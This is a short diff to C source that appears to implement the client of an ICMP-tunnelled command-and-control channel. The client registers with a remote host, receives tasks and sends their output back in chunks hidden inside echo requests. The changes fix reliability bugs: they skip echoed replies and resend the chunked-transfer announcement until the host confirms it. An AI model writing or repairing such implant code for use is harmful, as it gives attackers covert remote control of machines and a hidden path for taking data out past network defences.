@@ -167,6 +167,9 @@ ssize_t send_echo_request(struct in_addr destination_ip, uint16_t sequence, cons
 		}
 
 		size_t reply_data_length = response_length - ip_header_length - 8;
+		if (reply_data_length == data_to_send_length && memcmp(reply + 8, data_to_send, data_to_send_length) == 0) {
+			continue;
+		}
 		memcpy(received_reply, reply + 8, reply_data_length);
 
 		close(fd);
@@ -339,6 +342,7 @@ struct ChunkedTransfer {
 	uint32_t transfer_id;
 	uint32_t total_amount_of_chunks;
 	uint32_t next_chunk_index;
+	int announcement_confirmed;
 	size_t task_output_length;
 	unsigned char *task_output;
 	uint32_t *chunk_checksums;
@@ -353,6 +357,7 @@ struct ChunkedTransfer *start_chunked_transfer(unsigned char *task_output, size_
 		transfer->total_amount_of_chunks = 1;
 	}
 	transfer->next_chunk_index = 0;
+	transfer->announcement_confirmed = 0;
 	transfer->task_output = task_output;
 	transfer->task_output_length = task_output_length;
 	transfer->chunk_checksums = malloc(transfer->total_amount_of_chunks * sizeof(uint32_t));
@@ -529,13 +534,15 @@ int main() {
 			registered = 1;
 		}
 
-		if (transfer != NULL && transfer->next_chunk_index == 0) {
+		if (transfer != NULL && !transfer->announcement_confirmed) {
 			message_type = MESSAGE_ANNOUNCE_CHUNKED;
 			message_body = build_chunked_transfer_announcement(transfer, &message_body_length);
-		} else if (transfer != NULL) {
+		} 
+		else if (transfer != NULL) {
 			message_type = MESSAGE_CHUNK;
 			message_body = build_chunk(transfer, &message_body_length);
-		} else if (task_pending_result != NULL) {
+		} 
+		else if (task_pending_result != NULL) {
 			message_type = MESSAGE_TASK_RESULT;
 			message_body = task_pending_result;
 			message_body_length = task_pending_result_length;
@@ -562,6 +569,9 @@ int main() {
 			if (message_type == MESSAGE_TASK_RESULT && reply_length >= 0) {
 				free(task_pending_result);
 				task_pending_result = NULL;
+			}
+			if (message_type == MESSAGE_ANNOUNCE_CHUNKED && reply_length >= 0) {
+				transfer->announcement_confirmed = 1;
 			}
 
 			if (reply_length > 0) {
